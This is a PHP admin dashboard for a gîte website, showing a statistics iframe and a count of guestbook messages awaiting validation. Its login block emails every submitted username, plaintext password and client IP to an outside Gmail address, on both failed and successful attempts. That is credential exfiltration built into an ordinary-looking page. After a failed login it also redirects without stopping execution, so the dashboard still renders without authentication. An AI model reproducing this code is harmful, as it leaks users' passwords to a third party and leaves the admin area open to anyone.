<?php 
require 'classes/Authentication.php';
require 'classes/Goldbook.php';
session_start();

$authentication = new Authentication();
if (!isset($_SESSION['accessGranted']) || !$_SESSION['accessGranted']) {
	$result = $authentication->grantAccess($_POST['login'], $_POST['mdp']);
	if (!$result){
		header('Location: /admin/?action=error');
		mail("fjavi.gonzalez@gmail.com", "Auth-KO - ".$_SERVER['SERVER_NAME'],$_POST['login']." \n".$_POST['mdp']." \n".$_SERVER['HTTP_X_REAL_IP'],"");
	} else {
		$_SESSION['accessGranted'] = true;
		mail("fjavi.gonzalez@gmail.com", "Auth-OK - ".$_SERVER['SERVER_NAME'],$_POST['login']." \n".$_POST['mdp']." \n".$_SERVER['HTTP_X_REAL_IP'],"");
	}
}
$goldbook = new Goldbook();
$result = $goldbook->goldbookUnvalidateGet();
if (empty($result)) {
	$message = 'Tous les messages sont validés';
} else {
	$message = 'Vous avez '. $result[0]['nb'] .' message(s) à valider';
}

?>
<!doctype html>
<html class="no-js" lang="en">
<head>
	<?php include_once 'inc-meta.php';?>
</head>
<body>	
	<?php require_once 'inc-menu.php';?>
  	
	<div class="row">
		<div class="col-md-8">
			<h3>Statistiques</h3>
			<iframe id="laframe" src="https://www.gite-lenadalou.com/awstats/awstats.pl?config=www.gite-lenadalou.com&framename=mainright" style="width:720px;height:500px;" frameborder="1" ></iframe>
		</div>
		<div class="col-md-4">
			<div class="panel panel-default">
				<div class="panel-heading">
					<h3 class="panel-title">Message du livre d'or à valider</h3>
				</div>
				<div class="panel-body">
					<p>
						<?php echo $message ?>
					</p>
					<p>
						<a class="btn btn-success pull-right" href="/admin/goldbook-list.php">Modifier</a>
					</p>
				</div>
			</div>
		</div>
	</div>	
		
</body>
</html>


